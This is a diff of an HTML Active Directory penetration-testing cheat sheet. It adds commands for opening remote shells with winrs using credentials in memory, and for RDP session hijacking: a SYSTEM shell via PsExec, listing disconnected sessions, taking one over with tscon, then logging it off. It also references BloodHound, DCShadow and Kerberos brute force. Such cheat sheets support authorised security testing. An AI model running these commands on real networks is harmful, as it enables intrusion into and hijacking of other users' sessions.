@@ -783,7 +783,11 @@ Invoke-BloodHound<span class="w"> </span>-CollectionMethods<span class="w"> </sp
 <p>Open a remote interactive session (one-to-one approach):</p>
 <div class="highlight"><pre><span></span><code><span class="c"># Stateless Session</span>
 <span class="nb">Enter-PSSession</span> <span class="n">-Computer</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span>
+
 <span class="n">winrs</span><span class="p">.</span><span class="n">exe</span> <span class="n">-u</span><span class="p">:&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span><span class="p">:&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-r</span><span class="p">:&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">cmd</span>
+
+<span class="c">## Using credentials in memory</span>
+<span class="n">winrs</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span><span class="p">:&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">cmd</span>
 
 <span class="c"># Stateful Session</span>
 <span class="c">## Create a remote session</span>
@@ -1559,11 +1563,18 @@ lsadump::dcshadow<span class="w"> </span>/push
 </code></pre></div>
 <p>Note: service executables are different from standard .exe files; non-service executables get killed by the service manager almost immediately.</p>
 <p>RDP Hijacking (requires Administrator privileges):</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># List current active sessions: look for sessions in Disc state (sessions currently opened but not used)</span>
+<div class="highlight"><pre><span></span><code><span class="c1"># If current user is not nt authority\system, open a shell as Administrator</span>
+PsExec64.exe<span class="w"> </span>-s<span class="w"> </span>cmd.exe
+
+<span class="c1"># List current active sessions: look for sessions in Disc state (sessions currently opened but not used)</span>
 query<span class="w"> </span>user
+query<span class="w"> </span>sessions
 
 <span class="c1"># Connect to a session</span>
-tscon.exe<span class="w"> </span>&lt;session<span class="w"> </span>id<span class="w"> </span>or<span class="w"> </span>session<span class="w"> </span>anme&gt;<span class="w"> </span>/dest:&lt;current<span class="w"> </span>session<span class="w"> </span>name&gt;
+tscon.exe<span class="w"> </span>&lt;session<span class="w"> </span>id<span class="w"> </span>or<span class="w"> </span>session<span class="w"> </span>anme&gt;<span class="w"> </span>/dest:&lt;current<span class="w"> </span>session<span class="w"> </span>name<span class="w"> </span>or<span class="w"> </span><span class="s2">"console"</span>&gt;
+
+<span class="c1"># Clear session</span>
+logoff<span class="w"> </span>&lt;session<span class="w"> </span>id<span class="w"> </span>or<span class="w"> </span>session<span class="w"> </span>name&gt;
 </code></pre></div>
 <h2 id="kerberos-commons_1">Kerberos Commons</h2>
 <p>Brute-force user accounts from a domain controller using a supplied wordlist:</p>
